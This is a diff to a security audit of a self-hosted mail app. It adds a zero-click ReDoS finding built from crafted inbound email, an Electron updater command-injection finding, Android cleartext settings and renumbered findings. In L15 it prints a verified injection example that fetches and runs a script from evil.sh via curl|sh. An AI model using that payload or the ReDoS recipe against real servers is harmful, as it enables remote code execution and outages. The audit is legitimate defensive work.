@@ -5,9 +5,14 @@
 **Scope:** whole application, weighted toward the unauthenticated attack surface, SSRF into the
 host's own network, and disclosure of mailbox contents.
 **Method:** manual source review of the full backend route/service tree, the frontend render and
-cache paths, the deployment manifests, and the CI workflows. Several findings were confirmed by
-executing the relevant module in isolation rather than by reading alone; those are marked
-**verified**.
+cache paths, the deployment manifests, the CI workflows, **and the Electron desktop and Capacitor
+Android shells**. Several findings were confirmed by executing the relevant module in isolation
+rather than by reading alone; those are marked **verified**.
+
+> **Second pass (expanded).** The first pass covered the auth surface. This revision adds the
+> desktop/mobile shells, the IMAP engine's ingest path, and the project's own ReDoS lint — which
+> surfaced the single most serious issue in the report (H1, a zero-interaction remote DoS). Finding
+> IDs were renumbered so severity reads top-to-bottom; H2–H4 were H1–H3 in the first pass.
 
 ---
 
@@ -18,13 +23,14 @@ behind `requireAuth` / `requireAdmin`, and that coverage was checked route by ro
 
 | Surface | Notes |
 | --- | --- |
-| `POST /api/auth/register` | gated on `registration_open` / invite — **except for the first user**, see H3 |
+| `POST /api/auth/register` | gated on `registration_open` / invite — **except for the first user**, see H4 |
+| *inbound email itself* | a synced message body is sanitized automatically, no login involved — **see H1** |
 | `POST /api/auth/login`, `/2fa/*`, `/forgot-password`, `/reset-password` | rate-limited per IP |
 | `GET /api/auth/registration-status`, `/api/auth/invite/:token` | invite tokens are 32 random bytes; not brute-forceable |
 | `GET /api/auth/oidc/providers` | provider names/slugs only |
 | `GET /auth/oidc/:slug/start`, `/callback` | outside the `/api` CSRF gate by design |
 | `GET/POST /oauth/microsoft*` | each handler checks `req.session.userId` itself |
-| `*` `/carddav/**`, `/.well-known/carddav` | HTTP Basic against `users` — **see H1** |
+| `*` `/carddav/**`, `/.well-known/carddav` | HTTP Basic against `users` — **see H2** |
 | `GET /api/health`, `/api/version`, `/api/update` | version is disclosed pre-auth (fingerprinting) |
 | `WSS /ws` upgrade | origin-checked against `APP_URL`, then session-checked |
 
@@ -32,7 +38,51 @@ behind `requireAuth` / `requireAdmin`, and that coverage was checked route by ro
 
 ## Findings
 
-### H1 — CardDAV Basic auth bypasses the admin's MFA policy
+### H1 — A single inbound email freezes the whole server (zero-interaction ReDoS) — **verified**
+
+`backend/src/services/emailSanitizer.js` (post-sanitize regex passes, lines ~179, 200–210, 388–389, 409)
+
+This is the finding that most directly answers "I'm about to expose this." `sanitizeEmail()` runs
+several hand-written regexes over the message HTML *after* sanitize-html — the dark-mode CSS
+stripper, the `url()` strippers, the anchor/href rewriters. Some are polynomial-time on crafted
+input. Fed a `<style>` block full of `[data-og` tokens with no closing `]`, the exported function's
+runtime scales as roughly the square of the body size:
+
+```
+payload   1.6 KB  ->      19 ms
+payload   3.2 KB  ->     150 ms
+payload   6.4 KB  ->   1,064 ms
+payload  12.8 KB  ->   8,480 ms
+payload  25.6 KB  ->  68,178 ms      ← one 25 KB email = 68 s of blocked CPU
+```
+
+Node is single-threaded, and this is synchronous work, so those 68 seconds freeze **everything**:
+every other user's HTTP request, every WebSocket push, every account's IMAP sync. A ~100 KB body —
+well within normal email size — extrapolates to roughly a quarter-hour of full stall. A handful of
+such messages is an indefinite outage.
+
+**Why it needs no login and no click.** `sanitizeEmail` is called on the ingest path, not just on
+open: `imapManager.js:2472` (`syncMessages`, `prefetchBody = true` by default) and
+`imapManager.js:3841` (`prefetchNewMessageBodies`, fired in the background right after new mail
+arrives). So the trigger is simply *sending the victim an email*. The next inbox poll sanitizes the
+body and the server locks up. The two remote-image regexes on the open path (`blockRemoteImages`,
+measured 16× growth per doubling) are the same bug behind a click.
+
+**The tell:** the repo already ships the detector. `package.json` has
+`"audit:redos": "... eslint -c eslint.redos.config.mjs src"`, and running it flags **52** vulnerable
+expressions — including these. It is simply **not wired into CI** (`.github/workflows/ci.yml` runs
+`lint` and `lint:plugins`, never `audit:redos`), so the check exists and passes unnoticed.
+
+**Fix.** Two layers. (1) Cap the work: reject or truncate HTML bodies past a sane bound (a few
+hundred KB) before sanitizing, and skip the bespoke regex passes when the body is over budget.
+(2) Fix the expressions: the `scanPaired`/`stripEmailHead` machinery already shows the linear-scan
+pattern the project adopted elsewhere for exactly this reason — extend it to the dark-mode and
+`url()` passes, then add `npm run audit:redos` to CI as a required check so a regression can't
+merge. Retest with the curve above; a fixed pass stays flat.
+
+---
+
+### H2 — CardDAV Basic auth bypasses the admin's MFA policy
 
 `backend/src/routes/carddav.js:99-106`
 
@@ -62,7 +112,7 @@ enough to pull the contact database. `/carddav` also sits outside the `/api` scr
 
 ---
 
-### H2 — SSRF host guard misses the canonical IPv4-mapped IPv6 form — **verified**
+### H3 — SSRF host guard misses the canonical IPv4-mapped IPv6 form — **verified**
 
 `backend/src/services/hostValidation.js:30-52`
 
@@ -133,7 +183,7 @@ and range-check the 16 bytes — instead of string-prefix matching. Add the rang
 
 ---
 
-### H3 — First registrant on a freshly published instance becomes admin
+### H4 — First registrant on a freshly published instance becomes admin
 
 `backend/src/routes/auth.js:135-186`
 
@@ -152,7 +202,7 @@ instance up on localhost, register, *then* expose it.
 
 ---
 
-### M4 — Password login has no per-account rate limit
+### M5 — Password login has no per-account rate limit
 
 `backend/src/routes/auth.js:95-108`, `:229`
 
@@ -166,19 +216,19 @@ proxy pool targeting one known username.
 
 ---
 
-### M5 — No password strength requirement at registration
+### M6 — No password strength requirement at registration
 
 `backend/src/routes/auth.js:110-124`
 
 `/register` validates the *username* (length 1-120, no control characters) and then hashes
 whatever password arrives. A one-character password is accepted. `/reset-password:1085`
 requires at least 8 characters — so the same account can be created weaker than it can be
-reset. Combined with M4 this is the most likely route to a compromised account on a public
+reset. Combined with M5 this is the most likely route to a compromised account on a public
 instance.
 
 ---
 
-### M6 — `trust proxy: 1` mis-attributes the client IP behind a second proxy — **verified**
+### M7 — `trust proxy: 1` mis-attributes the client IP behind a second proxy — **verified**
 
 `backend/src/index.js:58`
 
@@ -203,7 +253,7 @@ must match the real chain depth.
 
 ---
 
-### M7 — `forgot-password` relays through an admin's SMTP account, and leaks account existence by timing
+### M8 — `forgot-password` relays through an admin's SMTP account, and leaks account existence by timing
 
 `backend/src/routes/auth.js:1031-1065`
 
@@ -223,27 +273,27 @@ or make it opt-in.
 
 ---
 
-### L8 — Screen lock is only enforced under `/api`
+### L9 — Screen lock is only enforced under `/api`
 
 `backend/src/index.js:151-156`. The 423 gate is mounted at `/api`, so a locked session still
 reaches `/oauth/microsoft*`, `/auth/oidc/:slug/start?action=link`, and `/carddav`. Enough to
 link an OAuth account or read contacts while the screen shows the PIN prompt.
 
-### L9 — `/api/contacts/photo` reflects a stored Content-Type
+### L10 — `/api/contacts/photo` reflects a stored Content-Type
 
 `backend/src/routes/contacts.js:130-136`. The MIME type is taken from the stored `data:` URI —
 which arrives from a CardDAV `PUT` or a synced vCard — and set as the response header
 verbatim. Mitigated by the global `X-Content-Type-Options: nosniff` and by nginx's
 `script-src 'self'`, so it is hardening, not a live XSS. Pin it to an image allowlist.
 
-### L10 — `react-router` advisories in the frontend
+### L11 — `react-router` advisories in the frontend
 
 `npm audit` (production deps): 2 moderate on `react-router` ≤ 7.17.0 — open redirect via
 backslash in `<Link>`/`useNavigate`, plus an SSR-hydration issue that does not apply to this
 SPA build. `npm audit fix` clears both. The backend has **0** vulnerabilities across all
 dependency tiers.
 
-### L11 — `allowVulnerableTags: true` with `<style>` allowed
+### L12 — `allowVulnerableTags: true` with `<style>` allowed
 
 `backend/src/services/emailSanitizer.js:224-234`. Safe as shipped: email HTML renders in an
 iframe whose `sandbox` deliberately omits `allow-scripts`, under a `script-src 'none'` meta CSP
@@ -252,15 +302,44 @@ build (`MessagePane.jsx:2793`) renders that same HTML into the application DOM w
 `dangerouslySetInnerHTML`, where the sandbox no longer applies. Keep that flag off in
 production.
 
-### L12 — OIDC link flow is outside the CSRF gate
+### L13 — OIDC link flow is outside the CSRF gate
 
 `/auth/oidc/:slug/start?action=link` mutates `req.session.oidcPending` on a GET and is mounted
 outside `/api`. Exploiting it requires the attacker to control the victim's IdP session, so
 this is low, but the link flow deserves a CSRF token.
 
-### L13 — Token-endpoint error body logged verbatim
+### L14 — Token-endpoint error body logged verbatim
 
 `backend/src/routes/oidc.js:354` logs the full OIDC token response body on failure.
+
+### L15 — Electron auto-updater builds a shell command with incomplete escaping — **verified**
+
+`frontend/packages/electron/main.cjs:765-791`. On Linux the "Copy & Quit" update flow puts a
+`sudo apt install "<path>"` / `sudo dnf install "<path>"` string on the clipboard for the user to
+paste into a terminal. `quoteLinuxCommandPath` wraps the path in double quotes but, in the
+`$HOME/…` branch, escapes only `"` `\` `` ` `` — **not `$`**. A path segment containing `$(…)` or
+`${…}` survives into the copied command and executes on paste. Verified:
+
+```
+/home/victim/$(curl -s http://evil.sh|sh).deb
+   -> sudo apt install "$HOME/$(curl -s http:/evil.sh|sh).deb"
+```
+
+Reachability is low as shipped: the filename derives from the GitHub release asset of the
+hardcoded `maathimself/mailflow` repo over TLS, so injecting one implies control of that release —
+at which point the attacker ships a binary directly. It rises to real if you **fork and repoint
+`UPDATE_RELEASE_URL`** at your own releases (this is a self-host project; that is a normal thing to
+do), or a mirror sets a hostile `Content-Disposition`. Fix by escaping `$` in both branches, or
+better, stop hand-building a shell string — hand the file to the OS installer directly. The Android
+shell installs via `ACTION_INSTALL_PACKAGE` with a FileProvider URI and has no analogous string.
+
+### L16 — Android manifest allows global cleartext traffic
+
+`frontend/packages/android/.../AndroidManifest.xml`: `android:usesCleartextTraffic="true"`. The
+host normalizer (`NativeSecurity.isAllowedCleartextHost`) restricts which host you can *save* to
+loopback/RFC-1918, which is good — but the manifest flag itself permits cleartext for any resource
+the WebView loads, so a downgraded or mixed-content subresource isn't blocked at the platform
+layer. Prefer a `network_security_config.xml` scoped to private ranges over the blanket flag.
 
 ---
 
@@ -292,14 +371,25 @@ not:
 - **Offline cache.** Bounded, excludes attachments and any remote-image variant, and cleared on
   the `user → null` transition so it cannot outlive the session.
 - **CI.** No `pull_request_target`, no untrusted input interpolated into `run:` steps.
+- **Desktop shell (Electron).** `contextIsolation: true`, `nodeIntegration: false`, `sandbox:
+  true`; `setWindowOpenHandler` denies all popups and only opens http/https/mailto externally;
+  navigation is origin-locked with a time-boxed OIDC allowlist; updates check digest **and**
+  platform code-signature (Windows publisher / macOS Team ID) before launch. The clipboard string
+  in L15 is the one rough edge.
+- **Mobile shell (Android).** Update APK verified against the release SHA-256 with a
+  constant-time compare; redirects followed only across HTTPS; native message bridge gated on
+  `isMainFrame` + same-origin; privileged intents checked against a trust test; `allowBackup=false`.
 
 ---
 
 ## Suggested order
 
-1. **H3** before the host is publicly resolvable — it is the only finding that is a race you
-   can lose exactly once.
-2. **H1** and **H2** — both are small, contained patches.
-3. **M5** then **M4** — cheapest real reduction in account-takeover risk on a public instance.
-4. **M6** if anything sits in front of the bundled nginx.
-5. **M7**, then the L items.
+1. **H1** — the zero-interaction DoS. It is the one an attacker fires the day you go live, it
+   needs nothing but your address, and the fix (size cap + wire `audit:redos` into CI) is small.
+   Highest severity **and** among the cheapest — do it first.
+2. **H4** before the host is publicly resolvable — the only finding that is a race you can lose
+   exactly once.
+3. **H2** and **H3** — both small, contained patches.
+4. **M6** then **M5** — cheapest real reduction in account-takeover risk on a public instance.
+5. **M7** if anything sits in front of the bundled nginx.
+6. **M8**, then the L items (**L15** matters more if you fork and repoint the updater).
